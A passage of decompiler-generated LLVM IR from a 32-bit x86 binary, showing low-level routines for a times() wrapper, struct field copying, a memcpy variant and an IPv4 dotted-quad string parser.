  %v0_8053b89 = phi i32 [ %v0_8053b89.pre, %dec_label_pc_8053b71.dec_label_pc_8053b89_crit_edge ], [ -1, %dec_label_pc_8053b86 ], [ %v0_8053b74, %dec_label_pc_8053b64 ]
  %v2_8053b8b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8053b8b, i32* @edx, align 4
  store i32 %v0_8053b42, i32* @ebx, align 4
  ret i32 %v0_8053b89

; uselistorder directives
  uselistorder i32 %v0_8053b74, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_8053d1f, { 1, 0 }
  uselistorder label %dec_label_pc_8053b89, { 2, 1, 0 }
}

define i32 @function_8053b8f(%tms* %arg1) local_unnamed_addr {
dec_label_pc_8053b8f:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053b8f = load i32, i32* @edi, align 4
  store i32 %v0_8053b8f, i32* %stack_var_-4, align 4
  %v4_8053b93 = ptrtoint %tms* %arg1 to i32
  store i32 %v4_8053b93, i32* %edi.global-to-local, align 4
  %v0_8053b97 = load i32, i32* @ebx, align 4
  %v3_8053b9f = call i32 @times(%tms* %arg1)
  store i32 %v3_8053b9f, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8053b9f, -4095
  br i1 %tmp9, label %dec_label_pc_8053bb7, label %dec_label_pc_8053bab

dec_label_pc_8053bab:                             ; preds = %dec_label_pc_8053b8f
  %v1_8053bab = call i32 @function_8051a1b(i32 %v0_8053b97)
  %v0_8053bb0 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053bb0 = sub i32 0, %v0_8053bb0
  %v2_8053bb2 = inttoptr i32 %v1_8053bab to i32*
  store i32 %v1_8053bb0, i32* %v2_8053bb2, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8053bbb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8053bb7

dec_label_pc_8053bb7:                             ; preds = %dec_label_pc_8053b8f, %dec_label_pc_8053bab
  %v2_8053bbb = phi i32 [ %v0_8053b8f, %dec_label_pc_8053b8f ], [ %v2_8053bbb.pre, %dec_label_pc_8053bab ]
  %v0_8053bb7 = phi i32 [ %v3_8053b9f, %dec_label_pc_8053b8f ], [ -1, %dec_label_pc_8053bab ]
  store i32 %v2_8053bbb, i32* %edi.global-to-local, align 4
  ret i32 %v0_8053bb7

; uselistorder directives
  uselistorder i32 %v3_8053b9f, { 1, 0, 2 }
  uselistorder i32* @edi, { 5, 6, 7, 8, 9, 10, 156, 4, 161, 162, 169, 157, 0, 158, 159, 160, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 67, 68, 55, 56, 57, 58, 59, 60, 61, 1, 62, 63, 64, 65, 66, 167, 168, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 122, 22, 23, 24, 123, 124, 163, 164, 165, 166, 155, 126, 127, 128, 129, 130, 131, 113, 114, 115, 82, 83, 84, 85, 86, 25, 26, 27, 28, 29, 104, 105, 106, 92, 93, 94, 95, 96, 97, 132, 133, 134, 125, 135, 136, 137, 116, 117, 87, 81, 88, 89, 90, 91, 98, 99, 100, 101, 102, 103, 107, 108, 109, 110, 111, 112, 118, 119, 120, 121, 138, 139, 140, 141, 142, 143, 144, 145, 146, 3, 147, 148, 149, 150, 151, 152, 153, 154, 2, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder %tms* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053bb7, { 1, 0 }
}

define i32 @function_8053bbd(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8053bbd:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053bbe = load i32, i32* @ebx, align 4
  store i32 %v0_8053bbe, i32* %stack_var_-8, align 4
  %v4_8053bc2 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053bc2, i32* %esi.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v3_8053bcf = inttoptr i32 %arg2 to i8*
  %v4_8053bcf = call i32 @function_8051a6c(i8* %v3_8053bcf, i32 0, i32 88)
  store i32 %v4_8053bcf, i32* %eax.global-to-local, align 4
  %v2_8053bd4 = load i16, i16* %arg1, align 2
  %v3_8053bd4 = zext i16 %v2_8053bd4 to i32
  store i32 %v3_8053bd4, i32* %eax.global-to-local, align 4
  %v0_8053bd7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053bd7 = add i32 %v0_8053bd7, 4
  %v2_8053bd7 = inttoptr i32 %v1_8053bd7 to i32*
  store i32 0, i32* %v2_8053bd7, align 4
  %v0_8053bde = load i32, i32* %eax.global-to-local, align 4
  %v1_8053bde = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053bde = inttoptr i32 %v1_8053bde to i32*
  store i32 %v0_8053bde, i32* %v2_8053bde, align 4
  %v0_8053be0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053be0 = add i32 %v0_8053be0, 4
  %v2_8053be0 = inttoptr i32 %v1_8053be0 to i32*
  %v3_8053be0 = load i32, i32* %v2_8053be0, align 4
  store i32 %v3_8053be0, i32* %eax.global-to-local, align 4
  %v1_8053be3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053be3 = add i32 %v1_8053be3, 12
  %v3_8053be3 = inttoptr i32 %v2_8053be3 to i32*
  store i32 %v3_8053be0, i32* %v3_8053be3, align 4
  %v0_8053be6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053be6 = add i32 %v0_8053be6, 8
  %v2_8053be6 = inttoptr i32 %v1_8053be6 to i16*
  %v3_8053be6 = load i16, i16* %v2_8053be6, align 2
  %v4_8053be6 = zext i16 %v3_8053be6 to i32
  store i32 %v4_8053be6, i32* %eax.global-to-local, align 4
  %v1_8053bea = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053bea = add i32 %v1_8053bea, 16
  %v3_8053bea = inttoptr i32 %v2_8053bea to i32*
  store i32 %v4_8053be6, i32* %v3_8053bea, align 4
  %v0_8053bed = load i32, i32* %esi.global-to-local, align 4
  %v1_8053bed = add i32 %v0_8053bed, 10
  %v2_8053bed = inttoptr i32 %v1_8053bed to i16*
  %v3_8053bed = load i16, i16* %v2_8053bed, align 2
  %v4_8053bed = zext i16 %v3_8053bed to i32
  store i32 %v4_8053bed, i32* %eax.global-to-local, align 4
  %v1_8053bf1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053bf1 = add i32 %v1_8053bf1, 20
  %v3_8053bf1 = inttoptr i32 %v2_8053bf1 to i32*
  store i32 %v4_8053bed, i32* %v3_8053bf1, align 4
  %v0_8053bf4 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053bf4 = add i32 %v0_8053bf4, 12
  %v2_8053bf4 = inttoptr i32 %v1_8053bf4 to i16*
  %v3_8053bf4 = load i16, i16* %v2_8053bf4, align 2
  %v4_8053bf4 = zext i16 %v3_8053bf4 to i32
  store i32 %v4_8053bf4, i32* %eax.global-to-local, align 4
  %v1_8053bf8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053bf8 = add i32 %v1_8053bf8, 24
  %v3_8053bf8 = inttoptr i32 %v2_8053bf8 to i32*
  store i32 %v4_8053bf4, i32* %v3_8053bf8, align 4
  %v0_8053bfb = load i32, i32* %esi.global-to-local, align 4
  %v1_8053bfb = add i32 %v0_8053bfb, 14
  %v2_8053bfb = inttoptr i32 %v1_8053bfb to i16*
  %v3_8053bfb = load i16, i16* %v2_8053bfb, align 2
  %v4_8053bfb = zext i16 %v3_8053bfb to i32
  store i32 %v4_8053bfb, i32* %eax.global-to-local, align 4
  %v1_8053bff = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053bff = add i32 %v1_8053bff, 28
  %v3_8053bff = inttoptr i32 %v2_8053bff to i32*
  store i32 %v4_8053bfb, i32* %v3_8053bff, align 4
  %v0_8053c02 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c02 = add i32 %v0_8053c02, 16
  %v2_8053c02 = inttoptr i32 %v1_8053c02 to i16*
  %v3_8053c02 = load i16, i16* %v2_8053c02, align 2
  %v4_8053c02 = zext i16 %v3_8053c02 to i32
  store i32 %v4_8053c02, i32* %eax.global-to-local, align 4
  %v0_8053c06 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053c06 = add i32 %v0_8053c06, 36
  %v2_8053c06 = inttoptr i32 %v1_8053c06 to i32*
  store i32 0, i32* %v2_8053c06, align 4
  %v0_8053c0d = load i32, i32* %eax.global-to-local, align 4
  %v1_8053c0d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c0d = add i32 %v1_8053c0d, 32
  %v3_8053c0d = inttoptr i32 %v2_8053c0d to i32*
  store i32 %v0_8053c0d, i32* %v3_8053c0d, align 4
  %v0_8053c10 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c10 = add i32 %v0_8053c10, 20
  %v2_8053c10 = inttoptr i32 %v1_8053c10 to i32*
  %v3_8053c10 = load i32, i32* %v2_8053c10, align 4
  store i32 %v3_8053c10, i32* %eax.global-to-local, align 4
  %v1_8053c13 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c13 = add i32 %v1_8053c13, 44
  %v3_8053c13 = inttoptr i32 %v2_8053c13 to i32*
  store i32 %v3_8053c10, i32* %v3_8053c13, align 4
  %v0_8053c16 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c16 = add i32 %v0_8053c16, 24
  %v2_8053c16 = inttoptr i32 %v1_8053c16 to i32*
  %v3_8053c16 = load i32, i32* %v2_8053c16, align 4
  store i32 %v3_8053c16, i32* %eax.global-to-local, align 4
  %v1_8053c19 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c19 = add i32 %v1_8053c19, 48
  %v3_8053c19 = inttoptr i32 %v2_8053c19 to i32*
  store i32 %v3_8053c16, i32* %v3_8053c19, align 4
  %v0_8053c1c = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c1c = add i32 %v0_8053c1c, 28
  %v2_8053c1c = inttoptr i32 %v1_8053c1c to i32*
  %v3_8053c1c = load i32, i32* %v2_8053c1c, align 4
  store i32 %v3_8053c1c, i32* %eax.global-to-local, align 4
  %v1_8053c1f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c1f = add i32 %v1_8053c1f, 52
  %v3_8053c1f = inttoptr i32 %v2_8053c1f to i32*
  store i32 %v3_8053c1c, i32* %v3_8053c1f, align 4
  %v0_8053c22 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c22 = add i32 %v0_8053c22, 32
  %v2_8053c22 = inttoptr i32 %v1_8053c22 to i32*
  %v3_8053c22 = load i32, i32* %v2_8053c22, align 4
  store i32 %v3_8053c22, i32* %eax.global-to-local, align 4
  %v1_8053c25 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c25 = add i32 %v1_8053c25, 56
  %v3_8053c25 = inttoptr i32 %v2_8053c25 to i32*
  store i32 %v3_8053c22, i32* %v3_8053c25, align 4
  %v0_8053c28 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c28 = add i32 %v0_8053c28, 40
  %v2_8053c28 = inttoptr i32 %v1_8053c28 to i32*
  %v3_8053c28 = load i32, i32* %v2_8053c28, align 4
  store i32 %v3_8053c28, i32* %eax.global-to-local, align 4
  %v1_8053c2b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c2b = add i32 %v1_8053c2b, 64
  %v3_8053c2b = inttoptr i32 %v2_8053c2b to i32*
  store i32 %v3_8053c28, i32* %v3_8053c2b, align 4
  %v0_8053c2e = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c2e = add i32 %v0_8053c2e, 48
  %v2_8053c2e = inttoptr i32 %v1_8053c2e to i32*
  %v3_8053c2e = load i32, i32* %v2_8053c2e, align 4
  store i32 %v3_8053c2e, i32* %eax.global-to-local, align 4
  %v1_8053c31 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053c31 = add i32 %v1_8053c31, 72
  %v3_8053c31 = inttoptr i32 %v2_8053c31 to i32*
  store i32 %v3_8053c2e, i32* %v3_8053c31, align 4
  %v2_8053c37 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053c37, i32* @ebx, align 4
  ret i32 %v3_8053c2e

; uselistorder directives
  uselistorder i32 72, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 64, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 40, { 3, 2, 0, 4, 1 }
  uselistorder i32 56, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32 52, { 8, 7, 9, 10, 6, 1, 5, 0, 4, 2, 3, 11, 12, 13, 14 }
  uselistorder i32 48, { 5, 6, 4, 2, 3, 0, 7, 8, 9, 1 }
  uselistorder i32 32, { 24, 25, 38, 18, 23, 36, 37, 26, 27, 28, 1, 0, 2, 3, 22, 4, 5, 6, 7, 8, 33, 10, 9, 12, 11, 13, 14, 20, 19, 34, 35, 29, 30, 15, 31, 17, 16, 21, 32 }
  uselistorder i32 36, { 8, 7, 0, 2, 23, 10, 5, 4, 9, 20, 21, 12, 13, 14, 15, 24, 28, 25, 26, 11, 6, 16, 17, 18, 19, 3, 22, 27, 1, 29 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 24, { 12, 13, 10, 18, 19, 20, 11, 14, 15, 0, 1, 8, 36, 31, 21, 16, 3, 6, 7, 37, 32, 17, 33, 22, 23, 24, 5, 25, 4, 26, 27, 28, 29, 30, 34, 35, 38, 39, 40, 41, 9, 2 }
  uselistorder i32 20, { 17, 18, 5, 15, 22, 23, 24, 16, 19, 20, 21, 1, 2, 12, 25, 7, 10, 11, 26, 13, 9, 8, 6, 27, 28, 29, 30, 31, 14, 32, 33, 0, 3, 4 }
  uselistorder i32 16, { 39, 40, 32, 33, 34, 35, 36, 37, 15, 31, 67, 5, 42, 43, 44, 2, 6, 45, 46, 8, 7, 47, 3, 9, 38, 41, 16, 20, 30, 11, 12, 26, 48, 10, 59, 60, 27, 1, 21, 24, 25, 13, 23, 22, 0, 61, 62, 63, 28, 64, 4, 29, 65, 17, 49, 50, 51, 52, 53, 54, 55, 56, 57, 19, 14, 58, 18, 66 }
  uselistorder i32 8, { 37, 26, 27, 28, 29, 30, 31, 32, 33, 15, 110, 16, 111, 17, 24, 39, 40, 41, 42, 43, 44, 45, 3, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 4, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 19, 5, 20, 6, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 18, 87, 88, 7, 89, 90, 91, 92, 8, 93, 34, 35, 36, 38, 109, 102, 103, 104, 21, 2, 98, 99, 100, 101, 1, 25, 105, 106, 107, 22, 108, 94, 95, 96, 97, 10, 11, 12, 13, 14, 9, 23, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_8051a6c, { 2, 4, 3, 1, 0 }
}

define i32 @function_8053c3a(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8053c3a:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053c3b = load i32, i32* @esi, align 4
  store i32 %v0_8053c3b, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8053c3c = sdiv i32 %sext, 16777216
  store i32 %v4_8053c3c, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_8053c46 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053c46, i32* %edi.global-to-local, align 4
  %v2_8053c4a = udiv i32 %v4_8053c3c, 4
  %v3_8053c4d = inttoptr i32 %arg2 to i8*
  %v4_8053c4d = bitcast i16* %arg1 to i8*
  %v5_8053c4d = call i8* @_memcpy(i8* %v4_8053c4d, i8* %v3_8053c4d, i32 %v2_8053c4a)
  %v0_8053c4f = load i32, i32* %eax.global-to-local, align 4
  %v2_8053c4f = and i32 %v0_8053c4f, 2
  %v3_8053c4f = icmp eq i32 %v2_8053c4f, 0
  br i1 %v3_8053c4f, label %dec_label_pc_8053c55, label %dec_label_pc_8053c53

dec_label_pc_8053c53:                             ; preds = %dec_label_pc_8053c3a
  %v0_8053c53 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c53 = inttoptr i32 %v0_8053c53 to i16*
  %v2_8053c53 = load i16, i16* %v1_8053c53, align 2
  %v3_8053c53 = load i32, i32* %edi.global-to-local, align 4
  %v4_8053c53 = inttoptr i32 %v3_8053c53 to i16*
  store i16 %v2_8053c53, i16* %v4_8053c53, align 2
  %v5_8053c53 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053c53 = load i32, i32* %esi.global-to-local, align 4
  %v7_8053c53 = load i1, i1* @df, align 1
  %v8_8053c53 = select i1 %v7_8053c53, i32 -2, i32 2
  %v9_8053c53 = add i32 %v8_8053c53, %v5_8053c53
  %v10_8053c53 = add i32 %v8_8053c53, %v6_8053c53
  store i32 %v9_8053c53, i32* %edi.global-to-local, align 4
  store i32 %v10_8053c53, i32* %esi.global-to-local, align 4
  %v0_8053c55.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c55

dec_label_pc_8053c55:                             ; preds = %dec_label_pc_8053c3a, %dec_label_pc_8053c53
  %v0_8053c55 = phi i32 [ %v0_8053c4f, %dec_label_pc_8053c3a ], [ %v0_8053c55.pre, %dec_label_pc_8053c53 ]
  %v2_8053c55 = urem i32 %v0_8053c55, 2
  %v3_8053c55 = icmp eq i32 %v2_8053c55, 0
  br i1 %v3_8053c55, label %dec_label_pc_8053c5a, label %dec_label_pc_8053c59

dec_label_pc_8053c59:                             ; preds = %dec_label_pc_8053c55
  %v0_8053c59 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053c59 = inttoptr i32 %v0_8053c59 to i8*
  %v2_8053c59 = load i8, i8* %v1_8053c59, align 1
  %v3_8053c59 = load i32, i32* %edi.global-to-local, align 4
  %v4_8053c59 = inttoptr i32 %v3_8053c59 to i8*
  store i8 %v2_8053c59, i8* %v4_8053c59, align 1
  %v5_8053c59 = load i32, i32* %edi.global-to-local, align 4
  %v6_8053c59 = load i32, i32* %esi.global-to-local, align 4
  %v7_8053c59 = load i1, i1* @df, align 1
  %v8_8053c59 = select i1 %v7_8053c59, i32 -1, i32 1
  %v9_8053c59 = add i32 %v8_8053c59, %v5_8053c59
  %v10_8053c59 = add i32 %v8_8053c59, %v6_8053c59
  store i32 %v9_8053c59, i32* %edi.global-to-local, align 4
  store i32 %v10_8053c59, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053c5a

dec_label_pc_8053c5a:                             ; preds = %dec_label_pc_8053c55, %dec_label_pc_8053c59
  store i32 %v4_8053c46, i32* %eax.global-to-local, align 4
  %v2_8053c5e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8053c5e, i32* @esi, align 4
  ret i32 %v4_8053c46

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 5, 2, 3, 4, 0, 1 }
  uselistorder i1* @df, { 5, 6, 1, 0, 3, 4, 2 }
  uselistorder i32 4, { 3, 36, 37, 28, 29, 30, 31, 166, 167, 172, 173, 0, 177, 178, 179, 168, 14, 23, 169, 171, 174, 176, 45, 46, 47, 48, 49, 50, 4, 51, 52, 53, 54, 55, 56, 57, 58, 43, 44, 59, 16, 60, 61, 62, 63, 64, 65, 66, 5, 68, 67, 69, 6, 70, 15, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 8, 91, 92, 94, 93, 7, 175, 170, 27, 19, 32, 33, 34, 35, 38, 133, 134, 20, 95, 96, 97, 21, 99, 100, 143, 144, 145, 140, 141, 109, 110, 111, 39, 40, 2, 41, 42, 130, 131, 132, 115, 116, 117, 118, 119, 120, 146, 147, 112, 113, 114, 121, 122, 123, 124, 125, 126, 127, 128, 129, 135, 136, 137, 1, 138, 139, 142, 24, 148, 149, 150, 151, 153, 154, 152, 155, 156, 157, 160, 158, 159, 17, 22, 161, 18, 162, 163, 164, 165, 101, 102, 103, 25, 104, 105, 9, 106, 107, 108, 10, 11, 12, 13, 98, 180, 26 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7 }
  uselistorder i32* @esi, { 108, 109, 27, 28, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 18, 19, 110, 111, 6, 112, 113, 114, 125, 128, 129, 130, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 29, 33, 2, 34, 35, 36, 37, 38, 39, 40, 30, 31, 32, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0, 63, 64, 65, 66, 3, 67, 5, 68, 69, 70, 71, 7, 97, 98, 20, 4, 21, 22, 23, 24, 25, 126, 127, 99, 100, 26, 72, 73, 74, 86, 91, 87, 88, 95, 89, 90, 92, 93, 94, 96, 101, 102, 103, 104, 105, 106, 107, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 131 }
  uselistorder label %dec_label_pc_8053c5a, { 1, 0 }
  uselistorder label %dec_label_pc_8053c55, { 1, 0 }
}

define i32 @function_8053c61(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053c61:
  %v1_8053c6c = icmp eq i8* %arg1, null
  br i1 %v1_8053c6c, label %dec_label_pc_8053ced, label %dec_label_pc_8053c70

dec_label_pc_8053c70:                             ; preds = %dec_label_pc_8053c61
  %v4_8053c68 = ptrtoint i8* %arg1 to i32
  %v0_8053c7e.pre = load i32, i32* bitcast (i32** @global_var_8055628.72 to i32*), align 8
  br label %dec_label_pc_8053c7b

dec_label_pc_8053c7b:                             ; preds = %dec_label_pc_8053c70, %dec_label_pc_8053cc4
  %v0_8053cc4 = phi i32 [ 0, %dec_label_pc_8053c70 ], [ %v2_8053cca, %dec_label_pc_8053cc4 ]
  %v2_8053cc7 = phi i32 [ 1, %dec_label_pc_8053c70 ], [ %v3_8053cc7, %dec_label_pc_8053cc4 ]
  %v0_8053c7b = phi i32 [ %v4_8053c68, %dec_label_pc_8053c70 ], [ %v0_8053c7b3, %dec_label_pc_8053cc4 ]
  %v1_8053c7b = inttoptr i32 %v0_8053c7b to i8*
  %v2_8053c7b = load i8, i8* %v1_8053c7b, align 1
  %v3_8053c7b = sext i8 %v2_8053c7b to i32
  %v2_8053c84 = mul nsw i32 %v3_8053c7b, 2
  %v3_8053c84 = add i32 %v2_8053c84, %v0_8053c7e.pre
  %v4_8053c84 = inttoptr i32 %v3_8053c84 to i8*
  %v5_8053c84 = load i8, i8* %v4_8053c84, align 1
  %v6_8053c84 = and i8 %v5_8053c84, 8
  %v7_8053c84 = icmp eq i8 %v6_8053c84, 0
  br i1 %v7_8053c84, label %dec_label_pc_8053ced, label %dec_label_pc_8053c8b

dec_label_pc_8053c8b:                             ; preds = %dec_label_pc_8053c7b
  %v4_8053c9f.pre = load i32, i32* @edx, align 4
  %v2_8053c9f34 = load i8, i8* %v1_8053c7b, align 1
  %v3_8053c9f35 = zext i8 %v2_8053c9f34 to i32
  %v5_8053c9f36 = and i32 %v4_8053c9f.pre, -256
  %v6_8053c9f37 = or i32 %v3_8053c9f35, %v5_8053c9f36
  store i32 %v6_8053c9f37, i32* @edx, align 4
  %v2_8053ca138 = sext i8 %v2_8053c9f34 to i32
  %v2_8053ca439 = mul nsw i32 %v2_8053ca138, 2
  %v3_8053ca440 = add i32 %v2_8053ca439, %v0_8053c7e.pre
  %v4_8053ca441 = inttoptr i32 %v3_8053ca440 to i16*
  %v5_8053ca442 = load i16, i16* %v4_8053ca441, align 2
  %v2_8053ca944 = and i16 %v5_8053ca442, 8
  %v3_8053ca945 = icmp eq i16 %v2_8053ca944, 0
  %v1_8053cab46 = icmp eq i1 %v3_8053ca945, false
  br i1 %v1_8053cab46, label %dec_label_pc_8053c8f, label %dec_label_pc_8053cad

dec_label_pc_8053c8f:                             ; preds = %dec_label_pc_8053c8b, %dec_label_pc_8053c9e
  %v2_8053ca150 = phi i32 [ %v2_8053ca1, %dec_label_pc_8053c9e ], [ %v2_8053ca138, %dec_label_pc_8053c8b ]
  %v6_8053c9f49 = phi i32 [ %v6_8053c9f, %dec_label_pc_8053c9e ], [ %v6_8053c9f37, %dec_label_pc_8053c8b ]
  %v0_8053c9e48 = phi i32 [ %v1_8053c9e, %dec_label_pc_8053c9e ], [ %v0_8053c7b, %dec_label_pc_8053c8b ]
  %v1_8053c8f47 = phi i32 [ %v3_8053c92, %dec_label_pc_8053c9e ], [ 0, %dec_label_pc_8053c8b ]
  %v3_8053c8f = mul i32 %v1_8053c8f47, 10
  %v2_8053c92 = add i32 %v3_8053c8f, -48
  %v3_8053c92 = add i32 %v2_8053c92, %v2_8053ca150
  %v1_8053c96 = add i32 %v3_8053c92, -255
  %v6_8053c96 = sub i32 254, %v3_8053c92
  %v7_8053c96 = and i32 %v6_8053c96, %v3_8053c92
  %v8_8053c96 = icmp slt i32 %v7_8053c96, 0
  %v9_8053c96 = icmp eq i32 %v1_8053c96, 0
  %v10_8053c96 = icmp slt i32 %v1_8053c96, 0
  %v3_8053c9c = icmp eq i1 %v10_8053c96, %v8_8053c96
  %v4_8053c9c = icmp eq i1 %v9_8053c96, false
  %v5_8053c9c = and i1 %v4_8053c9c, %v3_8053c9c
  br i1 %v5_8053c9c, label %dec_label_pc_8053ced, label %dec_label_pc_8053c9e

dec_label_pc_8053c9e:                             ; preds = %dec_label_pc_8053c8f
  %v1_8053c9e = add i32 %v0_8053c9e48, 1
  %v1_8053c9f = inttoptr i32 %v1_8053c9e to i8*
  %v2_8053c9f = load i8, i8* %v1_8053c9f, align 1
  %v3_8053c9f = zext i8 %v2_8053c9f to i32
  %v5_8053c9f = and i32 %v6_8053c9f49, -256
  %v6_8053c9f = or i32 %v3_8053c9f, %v5_8053c9f
  store i32 %v6_8053c9f, i32* @edx, align 4
  %v2_8053ca1 = sext i8 %v2_8053c9f to i32
  %v2_8053ca4 = mul nsw i32 %v2_8053ca1, 2
  %v3_8053ca4 = add i32 %v2_8053ca4, %v0_8053c7e.pre
  %v4_8053ca4 = inttoptr i32 %v3_8053ca4 to i16*
  %v5_8053ca4 = load i16, i16* %v4_8053ca4, align 2
  %v2_8053ca9 = and i16 %v5_8053ca4, 8
  %v3_8053ca9 = icmp eq i16 %v2_8053ca9, 0
  %v1_8053cab = icmp eq i1 %v3_8053ca9, false
  br i1 %v1_8053cab, label %dec_label_pc_8053c8f, label %dec_label_pc_8053cad

dec_label_pc_8053cad:                             ; preds = %dec_label_pc_8053c9e, %dec_label_pc_8053c8b
  %v1_8053c8f.lcssa = phi i32 [ 0, %dec_label_pc_8053c8b ], [ %v3_8053c92, %dec_label_pc_8053c9e ]
  %v0_8053c9e.lcssa = phi i32 [ %v0_8053c7b, %dec_label_pc_8053c8b ], [ %v1_8053c9e, %dec_label_pc_8053c9e ]
  %v2_8053c9f.lcssa = phi i8 [ %v2_8053c9f34, %dec_label_pc_8053c8b ], [ %v2_8053c9f, %dec_label_pc_8053c9e ]
  %v6_8053ca4.lcssa.in = phi i16 [ %v5_8053ca442, %dec_label_pc_8053c8b ], [ %v5_8053ca4, %dec_label_pc_8053c9e ]
  %v8_8053cad = sub nsw i32 2, %v2_8053cc7
  %v9_8053cad = and i32 %v8_8053cad, %v2_8053cc7
  %v10_8053cad = icmp slt i32 %v9_8053cad, 0
  %v11_8053cad = icmp eq i32 %v2_8053cc7, 3
  %v12_8053cad = icmp slt i32 %v2_8053cc7, 3
  %v3_8053cb1 = icmp eq i1 %v12_8053cad, %v10_8053cad
  %v4_8053cb1 = icmp eq i1 %v11_8053cad, false
  %v5_8053cb1 = and i1 %v4_8053cb1, %v3_8053cb1
  br i1 %v5_8053cb1, label %dec_label_pc_8053cbb, label %dec_label_pc_8053cb3

dec_label_pc_8053cb3:                             ; preds = %dec_label_pc_8053cad
  %v10_8053cb3 = icmp eq i8 %v2_8053c9f.lcssa, 46
  %v1_8053cb6 = icmp eq i1 %v10_8053cb3, false
  br i1 %v1_8053cb6, label %dec_label_pc_8053ced, label %dec_label_pc_8053cb8

dec_label_pc_8053cb8:                             ; preds = %dec_label_pc_8053cb3
  br label %dec_label_pc_8053cc4

dec_label_pc_8053cbb:                             ; preds = %dec_label_pc_8053cad
  %v4_8053cbc = icmp ne i8 %v2_8053c9f.lcssa, 0
  %v2_8053cc0 = and i16 %v6_8053ca4.lcssa.in, 32
  %v3_8053cc0 = icmp eq i16 %v2_8053cc0, 0
  %or.cond = and i1 %v4_8053cbc, %v3_8053cc0
  br i1 %or.cond, label %dec_label_pc_8053ced, label %dec_label_pc_8053cc4

dec_label_pc_8053cc4:                             ; preds = %dec_label_pc_8053cbb, %dec_label_pc_8053cb8
  %v0_8053c7b3 = add i32 %v0_8053c9e.lcssa, 1
  %v2_8053cc4 = mul i32 %v0_8053cc4, 256
  %v3_8053cc7 = add nuw nsw i32 %v2_8053cc7, 1
  %v2_8053cca = or i32 %v1_8053c8f.lcssa, %v2_8053cc4
  %v7_8053cd0 = icmp sgt i32 %v2_8053cc7, 3
